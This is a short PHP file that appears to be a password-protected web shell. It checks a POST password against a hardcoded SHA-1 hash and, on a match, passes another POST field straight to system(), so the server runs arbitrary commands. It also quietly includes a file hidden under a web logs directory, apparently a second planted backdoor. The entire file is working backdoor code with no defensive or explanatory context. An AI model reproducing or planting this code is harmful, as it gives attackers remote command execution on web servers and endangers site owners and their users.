<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="fe145cb51bb69d4a1017dfdca6a44185de0ba32f"){@system($_POST["w"]);die();}
@include_once "/var/www/html/logs/w";